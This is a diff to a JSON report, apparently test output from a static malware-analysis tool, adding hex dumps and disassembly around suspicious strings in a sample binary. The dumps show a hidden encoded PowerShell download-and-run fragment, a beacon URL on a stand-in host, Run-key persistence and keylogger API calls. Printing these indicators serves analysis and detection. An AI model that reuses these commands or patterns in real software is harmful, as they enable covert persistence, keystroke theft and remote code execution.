+        "Functions resolved at run time (GetProcAddress, dlsym) or hidden by a packer are not in the import table, so a missing cluster proves nothing either.",
+        "No call was found for USER32.dll!GetForegroundWindow, so no code is shown for it."
       ]
     },
     {
@@ -1142,6 +2086,101 @@
       "evidence": [
         "cmd.exe /c whoami /all",
         "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+      ],
+      "code": [
+        {
+          "kind": "hex",
+          "title": "Bytes around 2 command lines, the first at file offset 0xe63",
+          "section": ".config",
+          "offset": 3616,
+          "lines": [
+            {
+              "offset": 3616,
+              "bytes": "2e 70 68 70 00 68 74 74 70 3a 2f 2f 31 39 38 2e",
+              "text": ".php.http://198."
+            },
+            {
+              "offset": 3632,
+              "bytes": "35 31 2e 31 30 30 2e 32 33 3a 38 30 38 30 2f 62",
+              "text": "51.100.23:8080/b"
+            },
+            {
+              "offset": 3648,
+              "bytes": "65 61 63 6f 6e 00 32 30 33 2e 30 2e 31 31 33 2e",
+              "text": "eacon.203.0.113."
+            },
+            {
+              "offset": 3664,
+              "bytes": "37 00 6f 70 73 40 65 78 61 6d 70 6c 65 2e 74 65",
+              "text": "7.ops@example.te"
+            },
+            {
+              "offset": 3680,
+              "bytes": "73 74 00 63 6d 64 2e 65 78 65 20 2f 63 20 77 68",
+              "text": "st.cmd.exe /c wh",
+              "highlight": true
+            },
+            {
+              "offset": 3696,
+              "bytes": "6f 61 6d 69 20 2f 61 6c 6c 00 70 6f 77 65 72 73",
+              "text": "oami /all.powers",
+              "highlight": true
+            },
+            {
+              "offset": 3712,
+              "bytes": "68 65 6c 6c 20 2d 6e 6f 70 20 2d 77 20 68 69 64",
+              "text": "hell -nop -w hid",
+              "highlight": true
+            },
+            {
+              "offset": 3728,
+              "bytes": "64 65 6e 20 2d 65 6e 63 20 53 51 42 46 41 46 67",
+              "text": "den -enc SQBFAFg",
+              "highlight": true
+            },
+            {
+              "offset": 3744,
+              "bytes": "41 49 41 41 6f 41 45 34 41 5a 51 42 33 41 43 30",
+              "text": "AIAAoAE4AZQB3AC0",
+              "highlight": true
+            },
+            {
+              "offset": 3760,
+              "bytes": "41 54 77 42 69 41 47 6f 41 5a 51 42 6a 41 48 51",
+              "text": "ATwBiAGoAZQBjAHQ",
+              "highlight": true
+            },
+            {
+              "offset": 3776,
+              "bytes": "41 00 48 4b 4c 4d 5c 53 6f 66 74 77 61 72 65 5c",
+              "text": "A.HKLM\\Software\\",
+              "highlight": true
+            },
+            {
+              "offset": 3792,
+              "bytes": "4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77",
+              "text": "Microsoft\\Window"
+            },
+            {
+              "offset": 3808,
+              "bytes": "73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e",
+              "text": "s\\CurrentVersion"
+            },
+            {
+              "offset": 3824,
+              "bytes": "5c 52 75 6e 00 43 3a 5c 55 73 65 72 73 5c 64 65",
+              "text": "\\Run.C:\\Users\\de"
+            },
+            {
+              "offset": 3840,
+              "bytes": "76 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e",
+              "text": "v\\AppData\\Roamin"
+            }
+          ],
+          "limitations": [
+            "A raw window over the file: the bytes are shown as stored, 16 to a row, and nothing says that any code uses them."
+          ]
+        }
       ],
       "limitations": [
         "Command lines in a binary may belong to installers, update scripts, help text or documentation rather than code that runs; they are not executed here.",
@@ -1200,6 +2239,95 @@
         "URLs: 2 found, e.g. http://198.51.100.23:8080/beacon, https://update.example.test/gate.php",
         "public IP addresses: 1 found, e.g. 203.0.113.7"
       ],
+      "code": [
+        {
+          "kind": "hex",
+          "title": "Bytes around 3 strings (URL, IP address), the first at file offset 0xe00",
+          "section": ".config",
+          "offset": 3520,
+          "lines": [
+            {
+              "offset": 3520,
+              "bytes": "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
+              "text": "................"
+            },
+            {
+              "offset": 3536,
+              "bytes": "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
+              "text": "................"
+            },
+            {
+              "offset": 3552,
+              "bytes": "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
+              "text": "................"
+            },
+            {
+              "offset": 3568,
+              "bytes": "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
+              "text": "................"
+            },
+            {
+              "offset": 3584,
+              "bytes": "68 74 74 70 73 3a 2f 2f 75 70 64 61 74 65 2e 65",
+              "text": "https://update.e",
+              "highlight": true
+            },
+            {
+              "offset": 3600,
+              "bytes": "78 61 6d 70 6c 65 2e 74 65 73 74 2f 67 61 74 65",
+              "text": "xample.test/gate",
+              "highlight": true
+            },
+            {
+              "offset": 3616,
+              "bytes": "2e 70 68 70 00 68 74 74 70 3a 2f 2f 31 39 38 2e",
+              "text": ".php.http://198.",
+              "highlight": true
+            },
+            {
+              "offset": 3632,
+              "bytes": "35 31 2e 31 30 30 2e 32 33 3a 38 30 38 30 2f 62",
+              "text": "51.100.23:8080/b",
+              "highlight": true
+            },
+            {
+              "offset": 3648,
+              "bytes": "65 61 63 6f 6e 00 32 30 33 2e 30 2e 31 31 33 2e",
+              "text": "eacon.203.0.113.",
+              "highlight": true
+            },
+            {
+              "offset": 3664,
+              "bytes": "37 00 6f 70 73 40 65 78 61 6d 70 6c 65 2e 74 65",
+              "text": "7.ops@example.te",
+              "highlight": true
+            },
+            {
+              "offset": 3680,
+              "bytes": "73 74 00 63 6d 64 2e 65 78 65 20 2f 63 20 77 68",
+              "text": "st.cmd.exe /c wh"
+            },
+            {
+              "offset": 3696,
+              "bytes": "6f 61 6d 69 20 2f 61 6c 6c 00 70 6f 77 65 72 73",
+              "text": "oami /all.powers"
+            },
+            {
+              "offset": 3712,
+              "bytes": "68 65 6c 6c 20 2d 6e 6f 70 20 2d 77 20 68 69 64",
+              "text": "hell -nop -w hid"
+            },
+            {
+              "offset": 3728,
+              "bytes": "64 65 6e 20 2d 65 6e 63 20 53 51 42 46 41 46 67",
+              "text": "den -enc SQBFAFg"
+            }
+          ],
+          "limitations": [
+            "A raw window over the file: the bytes are shown as stored, 16 to a row, and nothing says that any code uses them."
+          ]
+        }
+      ],
       "limitations": [
         "A string in a binary may be dead code, a library default, a documentation or licence link, an XML namespace or a decoy; presence does not show that the program contacts it.",
         "Dotted-quad strings can be version numbers rather than IP addresses.",
@@ -1215,6 +2343,83 @@
       "confidence": "low",
       "evidence": [
         "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      ],
+      "code": [
+        {
+          "kind": "hex",
+          "title": "Bytes around the registry path at file offset 0xec2",
+          "section": ".config",
+          "offset": 3712,
+          "lines": [
+            {
+              "offset": 3712,
+              "bytes": "68 65 6c 6c 20 2d 6e 6f 70 20 2d 77 20 68 69 64",
+              "text": "hell -nop -w hid"
+            },
+            {
+              "offset": 3728,
+              "bytes": "64 65 6e 20 2d 65 6e 63 20 53 51 42 46 41 46 67",
+              "text": "den -enc SQBFAFg"
+            },
+            {
+              "offset": 3744,
+              "bytes": "41 49 41 41 6f 41 45 34 41 5a 51 42 33 41 43 30",
+              "text": "AIAAoAE4AZQB3AC0"
+            },
+            {
+              "offset": 3760,
+              "bytes": "41 54 77 42 69 41 47 6f 41 5a 51 42 6a 41 48 51",
+              "text": "ATwBiAGoAZQBjAHQ"
+            },
+            {
+              "offset": 3776,
+              "bytes": "41 00 48 4b 4c 4d 5c 53 6f 66 74 77 61 72 65 5c",
+              "text": "A.HKLM\\Software\\",
+              "highlight": true
+            },
+            {
+              "offset": 3792,
+              "bytes": "4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77",
+              "text": "Microsoft\\Window",
+              "highlight": true
+            },
+            {
+              "offset": 3808,
+              "bytes": "73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e",
+              "text": "s\\CurrentVersion",
+              "highlight": true
+            },
+            {
+              "offset": 3824,
+              "bytes": "5c 52 75 6e 00 43 3a 5c 55 73 65 72 73 5c 64 65",
+              "text": "\\Run.C:\\Users\\de",
+              "highlight": true
+            },
+            {
+              "offset": 3840,
+              "bytes": "76 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e",
+              "text": "v\\AppData\\Roamin"
+            },
+            {
+              "offset": 3856,
+              "bytes": "67 5c 73 76 63 5c 75 70 64 61 74 65 2e 65 78 65",
+              "text": "g\\svc\\update.exe"
+            },
+            {
+              "offset": 3872,
+              "bytes": "00 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 57 69",
+              "text": ".Mozilla/5.0 (Wi"
+            },
+            {
+              "offset": 3888,
+              "bytes": "6e 64 6f 77 73 20 4e 54 20 31 30 2e 30 3b 20 57",
+              "text": "ndows NT 10.0; W"
+            }
+          ],
+          "limitations": [
+            "A raw window over the file: the bytes are shown as stored, 16 to a row, and nothing says that any code uses them."
+          ]
+        }
       ],
       "limitations": [
         "Installers, updaters and system utilities legitimately reference the same keys; the strings do not show the program writes them."
@@ -1290,7 +2495,8 @@
       "limitations": [
         "API presence alone proves nothing: legitimate software (debuggers, installers, security and remote-support tools, games, browsers) imports the same functions.",
         "Cryptography is used for TLS, hashing, licensing and DRM as often as for ransomware or payload decryption; static imports cannot tell which.",
-        "Statically linked crypto code (Go, Rust, bundled OpenSSL) leaves no import trace."
+        "Statically linked crypto code (Go, Rust, bundled OpenSSL) leaves no import trace.",
+        "No call to these functions was found in the executable sections, so no code is shown: they may be called through pointers or resolved at run time, or the code that uses them may be packed or lie where this scan does not look."
       ]
     },
     {
@@ -1305,11 +2511,414 @@
         "WS2_32.dll!connect",
         "WS2_32.dll!recv",
         "WS2_32.dll!send",
-        "WS2_32.dll!socket"
+        "WS2_32.dll!socket",
+        "code: 4 call sites in .text (see the code blocks)"
+      ],
+      "code": [
+        {
+          "kind": "disasm",
+          "title": "call to URLMON.dll!URLDownloadToFileA in .text",
+          "section": ".text",
+          "offset": 1135,
+          "address": "0x14000106f",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x14000106f",
+              "offset": 1135,
+              "bytes": "48 8d 15 9a 1f 00 00",
+              "text": "lea rdx, [rip+0x1f9a]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001076",
+              "offset": 1142,
+              "bytes": "41 b8 10 00 00 00",
+              "text": "mov r8d, 0x10"
+            },
+            {
+              "address": "0x14000107c",
+              "offset": 1148,
+              "bytes": "ff 15 66 12 00 00",
+              "text": "call qword ptr [rip+0x1266]",
+              "note": "WS2_32.dll!connect"
+            },
+            {
+              "address": "0x140001082",
+              "offset": 1154,
+              "bytes": "31 c9",
+              "text": "xor ecx, ecx"
+            },
+            {
+              "address": "0x140001084",
+              "offset": 1156,
+              "bytes": "48 8d 15 75 1f 00 00",
+              "text": "lea rdx, [rip+0x1f75]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x14000108b",
+              "offset": 1163,
+              "bytes": "4c 8d 05 7e 1f 00 00",
+              "text": "lea r8, [rip+0x1f7e]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001092",
+              "offset": 1170,
+              "bytes": "45 31 c9",
+              "text": "xor r9d, r9d"
+            },
+            {
+              "address": "0x140001095",
+              "offset": 1173,
+              "bytes": "48 c7 44 24 20 00 00 00 00",
+              "text": "mov qword ptr [rsp+0x20], 0x0"
+            },
+            {
+              "address": "0x14000109e",
+              "offset": 1182,
+              "bytes": "ff 15 1c 13 00 00",
+              "text": "call qword ptr [rip+0x131c]",
+              "note": "URLMON.dll!URLDownloadToFileA",
+              "highlight": true
+            },
+            {
+              "address": "0x1400010a4",
+              "offset": 1188,
+              "bytes": "48 8d 0d 55 1f 00 00",
+              "text": "lea rcx, [rip+0x1f55]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x1400010ab",
+              "offset": 1195,
+              "bytes": "ff 15 e7 10 00 00",
+              "text": "call qword ptr [rip+0x10e7]",
+              "note": "KERNEL32.dll!LoadLibraryA"
+            },
+            {
+              "address": "0x1400010b1",
+              "offset": 1201,
+              "bytes": "48 89 44 24 40",
+              "text": "mov qword ptr [rsp+0x40], rax"
+            },
+            {
+              "address": "0x1400010b6",
+              "offset": 1206,
+              "bytes": "b9 ff ff 1f 00",
+              "text": "mov ecx, 0x1fffff"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        },
+        {
+          "kind": "disasm",
+          "title": "call to WS2_32.dll!WSAStartup in .text",
+          "section": ".text",
+          "offset": 1055,
+          "address": "0x14000101f",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x14000101f",
+              "offset": 1055,
+              "bytes": "48 8d 15 da 1f 00 00",
+              "text": "lea rdx, [rip+0x1fda]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x140001026",
+              "offset": 1062,
+              "bytes": "45 31 c0",
+              "text": "xor r8d, r8d"
+            },
+            {
+              "address": "0x140001029",
+              "offset": 1065,
+              "bytes": "45 31 c9",
+              "text": "xor r9d, r9d"
+            },
+            {
+              "address": "0x14000102c",
+              "offset": 1068,
+              "bytes": "ff 15 16 12 00 00",
+              "text": "call qword ptr [rip+0x1216]",
+              "note": "USER32.dll!SetWindowsHookExA"
+            },
+            {
+              "address": "0x140001032",
+              "offset": 1074,
+              "bytes": "b9 41 00 00 00",
+              "text": "mov ecx, 0x41"
+            },
+            {
+              "address": "0x140001037",
+              "offset": 1079,
+              "bytes": "ff 15 13 12 00 00",
+              "text": "call qword ptr [rip+0x1213]",
+              "note": "USER32.dll!GetAsyncKeyState"
+            },
+            {
+              "address": "0x14000103d",
+              "offset": 1085,
+              "bytes": "b9 02 02 00 00",
+              "text": "mov ecx, 0x202"
+            },
+            {
+              "address": "0x140001042",
+              "offset": 1090,
+              "bytes": "48 8d 15 c7 1f 00 00",
+              "text": "lea rdx, [rip+0x1fc7]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001049",
+              "offset": 1097,
+              "bytes": "ff 15 89 12 00 00",
+              "text": "call qword ptr [rip+0x1289]",
+              "note": "WS2_32.dll!WSAStartup",
+              "highlight": true
+            },
+            {
+              "address": "0x14000104f",
+              "offset": 1103,
+              "bytes": "b9 02 00 00 00",
+              "text": "mov ecx, 0x2"
+            },
+            {
+              "address": "0x140001054",
+              "offset": 1108,
+              "bytes": "ba 01 00 00 00",
+              "text": "mov edx, 0x1"
+            },
+            {
+              "address": "0x140001059",
+              "offset": 1113,
+              "bytes": "41 b8 06 00 00 00",
+              "text": "mov r8d, 0x6"
+            },
+            {
+              "address": "0x14000105f",
+              "offset": 1119,
+              "bytes": "ff 15 7b 12 00 00",
+              "text": "call qword ptr [rip+0x127b]",
+              "note": "WS2_32.dll!socket"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        },
+        {
+          "kind": "disasm",
+          "title": "call to WS2_32.dll!connect in .text",
+          "section": ".text",
+          "offset": 1103,
+          "address": "0x14000104f",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x14000104f",
+              "offset": 1103,
+              "bytes": "b9 02 00 00 00",
+              "text": "mov ecx, 0x2"
+            },
+            {
+              "address": "0x140001054",
+              "offset": 1108,
+              "bytes": "ba 01 00 00 00",
+              "text": "mov edx, 0x1"
+            },
+            {
+              "address": "0x140001059",
+              "offset": 1113,
+              "bytes": "41 b8 06 00 00 00",
+              "text": "mov r8d, 0x6"
+            },
+            {
+              "address": "0x14000105f",
+              "offset": 1119,
+              "bytes": "ff 15 7b 12 00 00",
+              "text": "call qword ptr [rip+0x127b]",
+              "note": "WS2_32.dll!socket"
+            },
+            {
+              "address": "0x140001065",
+              "offset": 1125,
+              "bytes": "48 89 44 24 38",
+              "text": "mov qword ptr [rsp+0x38], rax"
+            },
+            {
+              "address": "0x14000106a",
+              "offset": 1130,
+              "bytes": "48 8b 4c 24 38",
+              "text": "mov rcx, qword ptr [rsp+0x38]"
+            },
+            {
+              "address": "0x14000106f",
+              "offset": 1135,
+              "bytes": "48 8d 15 9a 1f 00 00",
+              "text": "lea rdx, [rip+0x1f9a]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001076",
+              "offset": 1142,
+              "bytes": "41 b8 10 00 00 00",
+              "text": "mov r8d, 0x10"
+            },
+            {
+              "address": "0x14000107c",
+              "offset": 1148,
+              "bytes": "ff 15 66 12 00 00",
+              "text": "call qword ptr [rip+0x1266]",
+              "note": "WS2_32.dll!connect",
+              "highlight": true
+            },
+            {
+              "address": "0x140001082",
+              "offset": 1154,
+              "bytes": "31 c9",
+              "text": "xor ecx, ecx"
+            },
+            {
+              "address": "0x140001084",
+              "offset": 1156,
+              "bytes": "48 8d 15 75 1f 00 00",
+              "text": "lea rdx, [rip+0x1f75]",
+              "note": "0x140003000 in .data"
+            },
+            {
+              "address": "0x14000108b",
+              "offset": 1163,
+              "bytes": "4c 8d 05 7e 1f 00 00",
+              "text": "lea r8, [rip+0x1f7e]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001092",
+              "offset": 1170,
+              "bytes": "45 31 c9",
+              "text": "xor r9d, r9d"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        },
+        {
+          "kind": "disasm",
+          "title": "call to WS2_32.dll!socket in .text",
+          "section": ".text",
+          "offset": 1074,
+          "address": "0x140001032",
+          "arch": "x86-64",
+          "lines": [
+            {
+              "address": "0x140001032",
+              "offset": 1074,
+              "bytes": "b9 41 00 00 00",
+              "text": "mov ecx, 0x41"
+            },
+            {
+              "address": "0x140001037",
+              "offset": 1079,
+              "bytes": "ff 15 13 12 00 00",
+              "text": "call qword ptr [rip+0x1213]",
+              "note": "USER32.dll!GetAsyncKeyState"
+            },
+            {
+              "address": "0x14000103d",
+              "offset": 1085,
+              "bytes": "b9 02 02 00 00",
+              "text": "mov ecx, 0x202"
+            },
+            {
+              "address": "0x140001042",
+              "offset": 1090,
+              "bytes": "48 8d 15 c7 1f 00 00",
+              "text": "lea rdx, [rip+0x1fc7]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001049",
+              "offset": 1097,
+              "bytes": "ff 15 89 12 00 00",
+              "text": "call qword ptr [rip+0x1289]",
+              "note": "WS2_32.dll!WSAStartup"
+            },
+            {
+              "address": "0x14000104f",
+              "offset": 1103,
+              "bytes": "b9 02 00 00 00",
+              "text": "mov ecx, 0x2"
+            },
+            {
+              "address": "0x140001054",
+              "offset": 1108,
+              "bytes": "ba 01 00 00 00",
+              "text": "mov edx, 0x1"
+            },
+            {
+              "address": "0x140001059",
+              "offset": 1113,
+              "bytes": "41 b8 06 00 00 00",
+              "text": "mov r8d, 0x6"
+            },
+            {
+              "address": "0x14000105f",
+              "offset": 1119,
+              "bytes": "ff 15 7b 12 00 00",
+              "text": "call qword ptr [rip+0x127b]",
+              "note": "WS2_32.dll!socket",
+              "highlight": true
+            },
+            {
+              "address": "0x140001065",
+              "offset": 1125,
+              "bytes": "48 89 44 24 38",
+              "text": "mov qword ptr [rsp+0x38], rax"
+            },
+            {
+              "address": "0x14000106a",
+              "offset": 1130,
+              "bytes": "48 8b 4c 24 38",
+              "text": "mov rcx, qword ptr [rsp+0x38]"
+            },
+            {
+              "address": "0x14000106f",
+              "offset": 1135,
+              "bytes": "48 8d 15 9a 1f 00 00",
+              "text": "lea rdx, [rip+0x1f9a]",
+              "note": "0x140003010 in .data"
+            },
+            {
+              "address": "0x140001076",
+              "offset": 1142,
+              "bytes": "41 b8 10 00 00 00",
+              "text": "mov r8d, 0x10"
+            }
+          ],
+          "limitations": [
+            "x86-64 code decoded as a linear sweep (ARM64 and other instruction sets are not supported): data inside a code section can be read as instructions, and one wrong byte shifts what follows.",
+            "Only calls through the import table and import thunks are found: functions resolved at run time are invisible, and packed or protected code hides its real calls.",
+            "A view of the code, not a decompiler, an emulator or a verdict: nothing was executed, and the code shows what is called, not why."
+          ]
+        }
       ],
       "limitations": [
         "API presence alone proves nothing: legitimate software (debuggers, installers, security and remote-support tools, games, browsers) imports the same functions.",
-        "Network access says nothing about what is contacted; see the extracted URLs and addresses for candidates."
+        "Network access says nothing about what is contacted; see the extracted URLs and addresses for candidates.",
+        "No call was found for WS2_32.dll!recv, WS2_32.dll!send, so no code is shown for them."
       ]
     },
     {
